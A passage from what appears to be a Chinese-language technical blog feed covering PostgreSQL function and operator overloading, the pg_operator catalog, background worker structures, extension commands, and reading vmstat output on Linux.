class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> get_array</span><br><span class="line">(<span class="keyword">IN</span> anyelement, <span class="keyword">IN</span> anyelement, <span class="keyword">OUT</span> anyelement, <span class="keyword">OUT</span> anyarray)</span><br><span class="line"><span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">SELECT</span> $<span class="number">1</span>, <span class="built_in">ARRAY</span>[$<span class="number">1</span>, $<span class="number">2</span>];</span><br><span class="line">$$ LANGUAGE SQL;</span><br><span class="line"><span class="keyword">SELECT</span> get_array(<span class="number">4</span>,<span class="number">5</span>), get_array(<span class="string">'c'</span>::<span class="built_in">text</span>, <span class="string">'d'</span>::<span class="built_in">text</span>);</span><br><span class="line">  get_array  |  get_array  </span><br><span class="line"><span class="comment">-------------+-------------</span></span><br><span class="line"> (4,"&#123;4,5&#125;") | (c,"&#123;c,d&#125;")</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure></li></ul><h5 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h5><p>在Postgresql中,多个函数可共用一个函数名，但它们的参数必须得不同。与面向对象的函数重载类似。 因此在Posgresql删除函数时，必须显示指定参数列表。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">FUNCTION</span> get_array(anyelement, anyelement);</span><br></pre></td></tr></table></figure><p><br></p><ul><li><a href="https://gangzai.online/2018/08/22/database/Postgresql%E6%89%A9%E5%B1%95Sql-%E6%BA%90%E7%A0%81%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0/" target="_blank" rel="noopener">Postgresql扩展Sql-源码添加系统函数</a></li><li><a href="https://gangzai.online/2018/08/23/database/PostgreSql%E6%89%A9%E5%B1%95Sql-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%85%B1%E4%BA%AB%E5%BA%93-C%E5%87%BD%E6%95%B0/" target="_blank" rel="noopener">PostgreSql扩展Sql-动态加载共享库(C函数)</a></li><li><a href="https://gangzai.online/2018/08/30/database/Postgresql%E6%89%A9%E5%B1%95Sql-%E6%B7%BB%E5%8A%A0%E6%8F%92%E4%BB%B6/" target="_blank" rel="noopener">Postgresql扩展Sql-添加插件</a></li></ul><p><strong>参考</strong></p><p><a href="http://www.postgres.cn/docs/9.5/xfunc.html" target="_blank" rel="noopener">Postgresql 9.5 用户定义函数</a></p><p><a href="https://my.oschina.net/Suregogo/blog/311648?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">Postgresql 系统函数分析记录</a></p>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
            <tag> Postgresql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PostgresSql操作符重载</title>
      <link href="/2018/09/13/database/Postgresql%E6%93%8D%E4%BD%9C%E7%AC%A6%E9%87%8D%E8%BD%BD/"/>
      <url>/2018/09/13/database/Postgresql%E6%93%8D%E4%BD%9C%E7%AC%A6%E9%87%8D%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<p>运算符是一个保留字或字符主要用于PostgreSQL的语句的WHERE子句中执行操作，如比较和算术运算。</p><p>运算符用于指定一个PostgreSQL表中的条件，并在一份声明中多个条件作为连词。</p><ul><li>算术运算符</li><li>比较操作符</li><li>逻辑运算符</li><li>位运算符</li></ul><p><br><br><a id="more"></a></p><h4 id="操作命令"><a href="#操作命令" class="headerlink" title="操作命令"></a>操作命令</h4><h5 id="创建操作符"><a href="#创建操作符" class="headerlink" title="创建操作符"></a>创建操作符</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Command:     <span class="keyword">CREATE</span> <span class="keyword">OPERATOR</span></span><br><span class="line">Description: <span class="keyword">define</span> a <span class="keyword">new</span> <span class="keyword">operator</span></span><br><span class="line">Syntax:</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OPERATOR</span> <span class="keyword">name</span> (</span><br><span class="line">    <span class="keyword">PROCEDURE</span> = function_name</span><br><span class="line">    [, LEFTARG = left_type ] [, RIGHTARG = right_type ]</span><br><span class="line">    [, COMMUTATOR = com_op ] [, NEGATOR = neg_op ]</span><br><span class="line">    [, RESTRICT = res_proc ] [, <span class="keyword">JOIN</span> = join_proc ]</span><br><span class="line">    [, HASHES ] [, MERGES ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h5 id="删除操作符"><a href="#删除操作符" class="headerlink" title="删除操作符"></a>删除操作符</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Command:     <span class="keyword">DROP</span> <span class="keyword">OPERATOR</span></span><br><span class="line">Description: remove an <span class="keyword">operator</span></span><br><span class="line">Syntax:</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">OPERATOR</span> [ <span class="keyword">IF</span> <span class="keyword">EXISTS</span> ] <span class="keyword">name</span> ( &#123; left_type | <span class="keyword">NONE</span> &#125; , &#123; right_type | <span class="keyword">NONE</span> &#125; ) [, ...] [ <span class="keyword">CASCADE</span> | RESTRICT ]</span><br></pre></td></tr></table></figure><h5 id="查看系统操作符视图-pg-operator"><a href="#查看系统操作符视图-pg-operator" class="headerlink" title="查看系统操作符视图 pg_operator"></a>查看系统操作符视图 <code>pg_operator</code></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> pg_operator;</span><br></pre></td></tr></table></figure><h4 id="思考如何重载操作符"><a href="#思考如何重载操作符" class="headerlink" title="思考如何重载操作符?"></a>思考如何重载操作符?</h4><p>操作符可以被重载，也就是说相同的操作符名称可以用于具有不同操作数数量和类型的操作符。在创建相应处理操作符之前必须先创建底层函数。</p><p> 其执行的操作:</p><ol><li><code>create function</code> </li><li><code>create operation</code></li></ol><h5 id="方法一-internal-扩展-需要重新initdb"><a href="#方法一-internal-扩展-需要重新initdb" class="headerlink" title="方法一:    internal 扩展 (需要重新initdb)"></a>方法一:    <code>internal 扩展</code> (需要重新initdb)</h5><p>实际，重新再<code>pg_operator.h</code>重载操作符 类似于 <code>create function .... LANUAGE  internal</code> 方式。</p><p>需要将执行函数静态编译到Postgres  需要修改 <code>pg_proc.h</code> , 然后在 <code>pg_operator.h</code> 进行引用</p><p>不然将会报错。 提示 <code>FATAL:  42883: there is no built-in function named &quot;xxxxxx&quot;</code></p><ul><li><code>pg_opertor.h</code></li><li><code>pg_proc.h</code></li><li><code>执行函数</code>   此处执行函数可以 sql 语句编写，也可以在 <code>xxx.c</code> 文件实现</li></ul><p><strong>过程如下:</strong></p><ul><li><p><a href="https://gangzai.online/2018/08/22/database/Postgresql%E6%89%A9%E5%B1%95Sql-%E6%BA%90%E7%A0%81%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0/" target="_blank" rel="noopener">在Pg源码添加系统函数-包括在pg_proc.h添加内建函数已关联c源码函数</a></p></li><li><p><code>pg_operator.h</code> 编写指定操作符。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DATA(<span class="keyword">insert</span> <span class="keyword">OID</span> = <span class="number">3296</span> (  <span class="string">"="</span>    PGNSP PGUID b t f <span class="number">25</span> <span class="number">1700</span> <span class="number">16</span> <span class="number">3294</span> <span class="number">0</span> varchar_eq_numeric - - ));</span><br></pre></td></tr></table></figure></li></ul><h5 id="方法二-c-扩展-不需要重新initdb"><a href="#方法二-c-扩展-不需要重新initdb" class="headerlink" title="方法二: c 扩展(不需要重新initdb)"></a>方法二: <code>c 扩展</code>(不需要重新initdb)</h5><p>实际执行方式为<code>create function ..... LANUAGE C</code> , 在<code>xxx.so</code>共享库中查找执行函数。</p><ul><li><p><a href="https://gangzai.online/2018/08/30/database/Postgresql%E6%89%A9%E5%B1%95Sql-%E6%B7%BB%E5%8A%A0%E6%8F%92%E4%BB%B6/" target="_blank" rel="noopener">插件编写并进行加载-实现psql内建函数与c源码函数关联</a></p></li><li><p><code>pg中关联操作符与指定psql函数</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OPERATOR</span> <span class="keyword">name</span> (</span><br><span class="line">    <span class="keyword">PROCEDURE</span> = function_name</span><br><span class="line">    [, LEFTARG = left_type ] [, RIGHTARG = right_type ]</span><br><span class="line">    [, COMMUTATOR = com_op ] [, NEGATOR = neg_op ]</span><br><span class="line">    [, RESTRICT = res_proc ] [, <span class="keyword">JOIN</span> = join_proc ]</span><br><span class="line">    [, HASHES ] [, MERGES ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li><p><code>name</code></p></li><li><p><code>PROCEDURE</code>       </p><ul><li>用来实现这个操作符的psql函数</li></ul></li><li><p><code>LEFTARG</code></p><ul><li>这个操作符的左操作数（如果有）的数据类型。忽略这个选项 可以表示一个左一元操作符。</li></ul></li><li><p><code>RIGHTARG</code></p><ul><li>这个操作符的右操作数（如果有）的数据类型。忽略这个选项 可以表示一个右一元操作符。</li></ul></li><li><p><code>COMMUTATOR</code></p><ul><li>这个操作符的交换子。  意味着左右操作数类型与此类型相反,指定其操作符。</li></ul></li><li><p><code>NEGATOR</code></p><ul><li>这个操作符的求反器。  例如: <code>=</code> 操作符的 求反器为 <code>!=</code></li></ul></li><li><p><code>RESTRICT</code></p><ul><li>用于这个操作符的限制选择度估计函数。</li></ul></li><li><p><code>JOIN</code></p><ul><li>用于这个操作符的连接选择度估算函数。</li></ul></li><li><p><code>HASHES</code></p><ul><li>表示这个操作符可以支持哈希连接。</li></ul></li><li><p><code>MERGES</code></p><ul><li>表示这个操作符可以支持归并连接。</li></ul></li></ul></li><li><p>图示</p><p><img src="/img/postgresql/commutator_1.png" alt="未添加"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OPERATOR</span> pg_catalog.= (</span><br><span class="line">   leftarg = <span class="built_in">numeric</span>, rightarg = <span class="built_in">text</span>, <span class="keyword">procedure</span> = numeric_eq_varchar,</span><br><span class="line">    commutator = <span class="keyword">OPERATOR</span>(=)  <span class="comment">-- 添加左右参数交换操作函数</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><img src="/img/postgresql/commutator_2.png" alt="添加"></p><p><strong>此示例为添加其左右交换因子;</strong></p></li></ul><p><strong>示例:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION complex_abs_lt(complex, complex) RETURNS bool</span><br><span class="line">    AS &apos;filename&apos;, &apos;complex_abs_lt&apos;</span><br><span class="line">    LANGUAGE C IMMUTABLE STRICT;</span><br><span class="line"></span><br><span class="line">CREATE OPERATOR &lt; (</span><br><span class="line">   leftarg = complex, rightarg = complex, procedure = complex_abs_lt,</span><br><span class="line">   commutator = &gt; , negator = &gt;= ,</span><br><span class="line">   restrict = scalarltsel, join = scalarltjoinsel</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="源代码定义解析"><a href="#源代码定义解析" class="headerlink" title="源代码定义解析"></a>源代码定义解析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"cat src/include/catalog/pg_operator.h"</span></span><br><span class="line"></span><br><span class="line">CATALOG(pg_operator,<span class="number">2617</span>)</span><br><span class="line">&#123;</span><br><span class="line">NameDataoprname;<span class="comment">/* name of operator */</span></span><br><span class="line">Oidoprnamespace;<span class="comment">/* OID of namespace containing this oper */</span></span><br><span class="line">Oidoprowner;<span class="comment">/* operator owner */</span></span><br><span class="line"><span class="keyword">char</span>oprkind;<span class="comment">/* 'l', 'r', or 'b' */</span></span><br><span class="line"><span class="keyword">bool</span>oprcanmerge;<span class="comment">/* can be used in merge join? */</span></span><br><span class="line"><span class="keyword">bool</span>oprcanhash;<span class="comment">/* can be used in hash join? */</span></span><br><span class="line">Oidoprleft;<span class="comment">/* left arg type, or 0 if 'l' oprkind */</span></span><br><span class="line">Oidoprright;<span class="comment">/* right arg type, or 0 if 'r' oprkind */</span></span><br><span class="line">Oidoprresult;<span class="comment">/* result datatype */</span></span><br><span class="line">Oidoprcom;<span class="comment">/* OID of commutator oper, or 0 if none */</span></span><br><span class="line">Oidoprnegate;<span class="comment">/* OID of negator oper, or 0 if none */</span></span><br><span class="line">regprocoprcode;<span class="comment">/* OID of underlying function */</span></span><br><span class="line">regprocoprrest;<span class="comment">/* OID of restriction estimator, or 0 */</span></span><br><span class="line">regprocoprjoin;<span class="comment">/* OID of join estimator, or 0 */</span></span><br><span class="line">&#125; FormData_pg_operator;</span><br></pre></td></tr></table></figure><p><strong>参考</strong></p><p><a href="http://www.postgres.cn/docs/9.5/sql-createoperator.html" target="_blank" rel="noopener">Postgresql 9.5 Create Operator参考</a></p>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
            <tag> Postgresql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>性能监控 vmstat</title>
      <link href="/2018/09/12/commands/linux-%E6%80%A7%E8%83%BD%E7%9B%91%E6%8E%A7vmstat/"/>
      <url>/2018/09/12/commands/linux-%E6%80%A7%E8%83%BD%E7%9B%91%E6%8E%A7vmstat/</url>
      
        <content type="html"><![CDATA[<p>vmstat命令是最常见的Linux/Unix监控工具，可以展现给定时间间隔的服务器的状态值,包括服务器的CPU使用率，内存使用，虚拟内存交换情况,IO读写情况。这个命令是我查看Linux/Unix最喜爱的命令，一个是Linux/Unix都支持，二是相比top，我可以看到整个机器的CPU,内存,IO的使用情况，而不是单单看到各个进程的CPU使用率和内存使用率(使用场景不一样)。</p><p>一般vmstat工具的使用是通过两个数字参数来完成的:</p><ul><li>第一个参数是采样的时间间隔数，单位是秒.</li><li>第二个参数是采样的次数.</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----</span><br><span class="line"> r  b   swpd   free   buff  cache   si   so    bi    bo   <span class="keyword">in</span>   cs us sy id wa st</span><br><span class="line"> <span class="number">1</span>  <span class="number">0</span>      <span class="number">0</span> <span class="number">149772</span>      <span class="number">0</span> <span class="number">3485736</span>    <span class="number">0</span>    <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>   <span class="number">22</span>   <span class="number">34</span>  <span class="number">0</span>  <span class="number">0</span> <span class="number">100</span>  <span class="number">0</span>  <span class="number">0</span></span><br><span class="line"> <span class="number">0</span>  <span class="number">0</span>      <span class="number">0</span> <span class="number">149772</span>      <span class="number">0</span> <span class="number">3485736</span>    <span class="number">0</span>    <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>   <span class="number">10</span>   <span class="number">16</span>  <span class="number">0</span>  <span class="number">0</span> <span class="number">100</span>  <span class="number">0</span>  <span class="number">0</span></span><br><span class="line"> <span class="number">0</span>  <span class="number">0</span>      <span class="number">0</span> <span class="number">149772</span>      <span class="number">0</span> <span class="number">3485736</span>    <span class="number">0</span>    <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>   <span class="number">13</span>   <span class="number">25</span>  <span class="number">0</span>  <span class="number">0</span> <span class="number">100</span>  <span class="number">0</span>  <span class="number">0</span></span><br><span class="line"> <span class="number">0</span>  <span class="number">0</span>      <span class="number">0</span> <span class="number">149684</span>      <span class="number">0</span> <span class="number">3485756</span>    <span class="number">0</span>    <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>   <span class="number">65</span>   <span class="number">98</span>  <span class="number">1</span>  <span class="number">1</span> <span class="number">99</span>  <span class="number">0</span>  <span class="number">0</span></span><br><span class="line"> <span class="number">0</span>  <span class="number">0</span>      <span class="number">0</span> <span class="number">149772</span>      <span class="number">0</span> <span class="number">3485756</span>    <span class="number">0</span>    <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>   <span class="number">11</span>   <span class="number">18</span>  <span class="number">0</span>  <span class="number">0</span> <span class="number">100</span>  <span class="number">0</span>  <span class="number">0</span></span><br></pre></td></tr></table></figure><p><br><br><a id="more"></a></p><p><strong>解析</strong></p><p>Procs（进程）</p><ul><li>r: 运行队列中进程数量，这个值也可以判断是否需要增加CPU。（长期大于1）</li><li>b: 等待IO的进程数量。</li></ul><p>Memory（内存）</p><ul><li>swpd: 使用虚拟内存大小，如果swpd的值不为0，但是SI，SO的值长期为0，这种情况不会影响系统性能。</li><li>free: 空闲物理内存大小。</li><li>buff: 用作缓冲的内存大小。</li><li>cache: 用作缓存的内存大小，如果cache的值大的时候，说明cache处的文件数多，如果频繁访问到的文件都能被cache处，那么磁盘的读IO bi会非常小。</li></ul><p>Swap</p><ul><li>si: 每秒从交换区写到内存的大小，由磁盘调入内存。</li><li>so: 每秒写入交换区的内存大小，由内存调入磁盘。</li></ul><p>注意：内存够用的时候，这2个值都是0，如果这2个值长期大于0时，系统性能会受到影响，磁盘IO和CPU资源都会被消耗。有些朋友看到空闲内存（free）很少的或接近于0时，就认为内存不够用了，不能光看这一点，还要结合si和so，如果free很少，但是si和so也很少（大多时候是0），那么不用担心，系统性能这时不会受到影响的。</p><p>IO（现在的Linux版本块的大小为1kb）</p><ul><li>bi: 每秒读取的块数</li><li>bo: 每秒写入的块数</li></ul><p>注意：随机磁盘读写的时候，这2个值越大（如超出1024k)，能看到CPU在IO等待的值也会越大。</p><p>system（系统）</p><ul><li>in: 每秒中断数，包括时钟中断。</li><li>cs: 每秒上下文切换数。</li></ul><p>注意：上面2个值越大，会看到由内核消耗的CPU时间会越大。</p><p>CPU（以百分比表示）</p><ul><li><p>us: 用户进程执行时间百分比(user <a href="http://man.linuxde.net/time" target="_blank" rel="noopener">time</a>)</p><p>us的值比较高时，说明用户进程消耗的CPU时间多，但是如果长期超50%的使用，那么我们就该考虑优化程序算法或者进行加速。</p></li><li><p>sy: 内核系统进程执行时间百分比(system time)</p><p>sy的值高时，说明系统内核消耗的CPU资源多，这并不是良性表现，我们应该检查原因。</p></li><li><p>wa: IO等待时间百分比</p><p>wa的值高时，说明IO等待比较严重，这可能由于磁盘大量作随机访问造成，也有可能磁盘出现瓶颈（块操作）。</p></li><li><p>id: 空闲时间百分比</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 命令,性能监控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
            <tag> 性能监控 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Postgresql-后台进程</title>
      <link href="/2018/09/01/database/Postgresql-%E5%90%8E%E5%8F%B0%E8%BF%9B%E7%A8%8B/"/>
      <url>/2018/09/01/database/Postgresql-%E5%90%8E%E5%8F%B0%E8%BF%9B%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>通俗来讲，就是运行在后台的一个或多个工作线程。 可以以扩展的方式存在。该进程的启动/停止/监控都是通过postgres来管理的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># source:src/<span class="meta-keyword">include</span>/postmaster/bgworker.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BackgroundWorker</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span>bgw_name[BGW_MAXLEN]; <span class="comment">//后台bgw的名称</span></span><br><span class="line"><span class="keyword">int</span>bgw_flags;</span><br><span class="line">BgWorkerStartTime bgw_start_time;</span><br><span class="line"><span class="keyword">int</span>bgw_restart_time;<span class="comment">/* in seconds, or BGW_NEVER_RESTART */</span></span><br><span class="line"><span class="keyword">char</span>bgw_library_name[BGW_MAXLEN]; # 动态库的名称</span><br><span class="line"><span class="keyword">char</span>bgw_function_name[BGW_MAXLEN]; <span class="meta"># bgw的进程主函数</span></span><br><span class="line">Datumbgw_main_arg;# 进程主函数的入参</span><br><span class="line"><span class="keyword">char</span>bgw_extra[BGW_EXTRALEN]; # MyBgworkerEntry的参数。</span><br><span class="line"><span class="keyword">pid_t</span>bgw_notify_pid; <span class="comment">/* SIGUSR1 this backend on start/stop */</span></span><br><span class="line">&#125; BackgroundWorker;</span><br></pre></td></tr></table></figure><p><br><br><a id="more"></a></p><p><strong><code>bgw_flags取值:</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Pass this flag to have your worker be able to connect to shared memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BGWORKER_SHMEM_ACCESS0x0001    # 是否允许访问共享内存</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This flag means the bgworker requires a database connection.  The connection</span></span><br><span class="line"><span class="comment"> * is not established automatically; the worker must establish it later.</span></span><br><span class="line"><span class="comment"> * It requires that BGWORKER_SHMEM_ACCESS was passed too.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BGWORKER_BACKEND_DATABASE_CONNECTION0x0002  # 是否允许连接数据库</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This class is used internally for parallel queries, to keep track of the</span></span><br><span class="line"><span class="comment"> * number of active parallel workers and make sure we never launch more than</span></span><br><span class="line"><span class="comment"> * max_parallel_workers parallel workers at the same time.  Third party</span></span><br><span class="line"><span class="comment"> * background workers should not use this class.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BGWORKER_CLASS_PARALLEL0x0010      # 是否允许并行执行query</span></span><br></pre></td></tr></table></figure><p><strong><code>bgw_start_time启动模式取值:</code></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef enum</span><br><span class="line">&#123;</span><br><span class="line">BgWorkerStart_PostmasterStart,  # 紧随postmaster一起启动(不能连接数据库)</span><br><span class="line">BgWorkerStart_ConsistentState,  # 只是在热备模式中是一致状态，就允许启动(只能是只读模式)</span><br><span class="line">BgWorkerStart_RecoveryFinished  # 数据库进入一切正常模式，能正常的进行读写</span><br><span class="line">&#125; BgWorkerStartTime;</span><br></pre></td></tr></table></figure><h4 id="如何启动工作"><a href="#如何启动工作" class="headerlink" title="如何启动工作:"></a>如何启动工作:</h4><ul><li><code>static(RegisterBackgroundWorker)</code></li></ul><ol><li>首先判断Postmaster是否启动</li><li>判断动态库是否添加配置文件<code>shard_preload_libraries</code>以及动态库名字是否等于”postgres”</li><li><code>SanityCheckBackgroundWorker(worker, LOG)</code>     参数<ol><li>检查 <code>bgw_flags &amp; BGWORKER_BACKEND_DATABASE_CONNECTION</code></li><li><code>workrt-&gt;bgw_restart_time</code></li></ol></li><li><code>bgw_notify_pid 是否 == 0</code></li><li><code>++numworkers &gt; max_worker_processes</code>  判断后台<code>worker processes</code> 是否大于最大<code>max_worker_processes</code></li><li>插入slist_push_head(); 单链表;</li></ol><p><strong>GDB调试postgres数据</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bgw_name = "logical replication launcher", '\000' &lt;repeats 35 times&gt;, </span><br><span class="line">bgw_flags = <span class="number">3</span>, </span><br><span class="line">bgw_start_time = BgWorkerStart_RecoveryFinished, </span><br><span class="line">bgw_restart_time = <span class="number">5</span>, </span><br><span class="line">bgw_library_name = "postgres", '\000' &lt;repeats 55 times&gt;, </span><br><span class="line">bgw_function_name = "ApplyLauncherMain", '\000' &lt;repeats 46 times&gt;, </span><br><span class="line">bgw_main_arg = <span class="number">0</span>, </span><br><span class="line">bgw_extra = '\000' &lt;repeats 127 times&gt;, </span><br><span class="line">bgw_notify_pid = <span class="number">0</span></span><br></pre></td></tr></table></figure><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
            <tag> Postgresql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Postgresql扩展Sql-添加插件</title>
      <link href="/2018/08/30/database/Postgresql%E6%89%A9%E5%B1%95Sql-%E6%B7%BB%E5%8A%A0%E6%8F%92%E4%BB%B6/"/>
      <url>/2018/08/30/database/Postgresql%E6%89%A9%E5%B1%95Sql-%E6%B7%BB%E5%8A%A0%E6%8F%92%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>我们都知道 PostgreSQL 提供了丰富数据库内核编程的接口，允许开发者以插件的形式把功能融入数据库内核。PostgreSQL 提供了一个插件管理模块，用于管理用户创建的插件。    {插件编写可以参照共享库编写;}</p><p>PostgreSQL 支持使用<code>PL/pgSQL</code>语言或者原生的C语言开发扩展。<code>PL/pgSQL</code>开发简单，然而性能上较原生的C语言要逊色不少。有不少人已经做过相关的性能测试，这里就不再重复说明。我们开发的扩展的目的是为了增强生产的 PostgreSQL，自然要选择性能更好的C语言。</p><p><br><br><a id="more"></a></p><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><h4 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> extension exten_name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> EXTENSION [ <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> ] extension_name</span><br><span class="line">    [ <span class="keyword">WITH</span> ] [ <span class="keyword">SCHEMA</span> schema_name ]</span><br><span class="line">             [ <span class="keyword">VERSION</span> <span class="keyword">version</span> ]</span><br><span class="line">             [ <span class="keyword">FROM</span> old_version ]</span><br><span class="line">             [ <span class="keyword">CASCADE</span> ]</span><br></pre></td></tr></table></figure><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> extension postgres_fdw <span class="keyword">cascade</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> EXTENSION [ <span class="keyword">IF</span> <span class="keyword">EXISTS</span> ] <span class="keyword">name</span> [, ...] [ <span class="keyword">CASCADE</span> | RESTRICT ]</span><br></pre></td></tr></table></figure><h4 id="管理视图pg-extension"><a href="#管理视图pg-extension" class="headerlink" title="管理视图pg_extension"></a>管理视图<code>pg_extension</code></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 